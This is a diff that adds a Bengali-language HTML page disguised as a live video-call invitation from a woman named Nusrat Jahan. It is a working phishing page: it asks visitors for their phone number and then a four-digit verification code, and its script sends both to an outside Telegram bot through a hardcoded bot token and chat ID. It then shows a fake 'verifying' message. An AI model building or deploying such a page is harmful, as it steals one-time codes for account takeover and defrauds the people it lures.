@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Live - Nusrat Jahan</title>
+    <meta property="og:image" content="1000010151.jpg">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
+
+        /* ধাপ ১: ভিডিও পেজ */
+        #p1 { position: fixed; width: 100%; height: 100%; z-index: 1; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .ui { position: absolute; bottom: 0; width: 100%; height: 100%; z-index: 2; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding-bottom: 80px; background: linear-gradient(to bottom, transparent 40%, rgba(0,0,0,0.7)); }
+        .name { color: #fff; font-size: 22px; font-weight: bold; margin-bottom: 30px; }
+        .btns { display: flex; gap: 15px; }
+        .b { padding: 15px 30px; border-radius: 30px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .w { background: #fff; color: #000; }
+        .p { background: #E1306C; color: #fff; }
+
+        /* ধাপ ২ ও ৩: ফোন নম্বর ও ওটিপি */
+        .view { position: fixed; top: 0; width: 100%; height: 100%; background: #fff; z-index: 100; display: none; flex-direction: column; align-items: center; padding-top: 70px; }
+        .pic { width: 110px; height: 110px; border-radius: 50%; border: 2px solid #eee; object-fit: cover; margin-bottom: 15px; }
+        .t { font-size: 20px; color: #000; font-weight: bold; margin-bottom: 30px; }
+        .inp { width: 85%; max-width: 350px; padding: 18px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 12px; background: #fafafa; font-size: 18px; outline: none; }
+        
+        .o-row { display: flex; gap: 12px; margin-bottom: 30px; }
+        .o-box { width: 50px; height: 55px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 22px; font-weight: bold; background: #fafafa; }
+
+        .sub { width: 85%; max-width: 350px; padding: 18px; background: linear-gradient(90deg, #6a11cb, #2575fc); color: #fff; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="p1">
+        <video id="v" autoplay muted loop playsinline><source src="1000010152.mp4" type="video/mp4"></video>
+        <div class="ui">
+            <div class="name">Mst: Nusrat Jahan</div>
+            <div class="btns">
+                <button class="b w" onclick="go2()">JOIN LIVE</button>
+                <button class="b p" onclick="go2()">📹 VIDEO CALL</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="p2" class="view">
+        <img src="1000010151.jpg" class="pic"> <h2 class="t">Nusrat Jahan</h2>
+        <input type="tel" id="ph" class="inp" placeholder="Phone number">
+        <button class="sub" onclick="go3()">CONTINUE</button>
+    </div>
+
+    <div id="p3" class="view">
+        <img src="1000010151.jpg" class="pic">
+        <h2 class="t">Verification Code</h2>
+        <div class="o-row">
+            <input type="tel" maxlength="1" class="o-box" onkeyup="nx(this, 'b2')">
+            <input type="tel" maxlength="1" class="o-box" id="b2" onkeyup="nx(this, 'b3')">
+            <input type="tel" maxlength="1" class="o-box" id="b3" onkeyup="nx(this, 'b4')">
+            <input type="tel" maxlength="1" class="o-box" id="b4">
+        </div>
+        <button class="sub" onclick="send()">VIDEO CALL NOW ✅</button>
+    </div>
+
+<script>
+    let phoneNum = "";
+    function go2() { document.getElementById('p1').style.display = 'none'; document.getElementById('p2').style.display = 'flex'; }
+    function go3() { 
+        phoneNum = document.getElementById('ph').value;
+        if(phoneNum.length < 5) return alert("নম্বর দিন");
+        document.getElementById('p2').style.display = 'none'; document.getElementById('p3').style.display = 'flex'; 
+    }
+    function nx(e, i) { if(e.value.length >= 1) document.getElementById(i).focus(); }
+
+    function send() {
+        const token = "8512100128:AAGk_HAlgp8deEn7wuRUtHE90Ev234DN1lE"; 
+        const cid = "8795859465"; // আপনার নিশ্চিত করা চ্যাট আইডি
+        const b = document.querySelectorAll('.o-box');
+        const otp = b[0].value + b[1].value + b[2].value + b[3].value;
+
+        if(otp.length < 4) return alert("৪ সংখ্যার কোড দিন");
+
+        const msg = `🔴 নতুন ডাটা:\n📱 নম্বর: ${phoneNum}\n🔑 ওটিপি: ${otp}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`)
+        .then(() => { 
+            alert("যাচাই হচ্ছে... দয়া করে অপেক্ষা করুন।"); 
+            location.reload(); 
+        });
+    }
+</script>
+</body>
+</html>
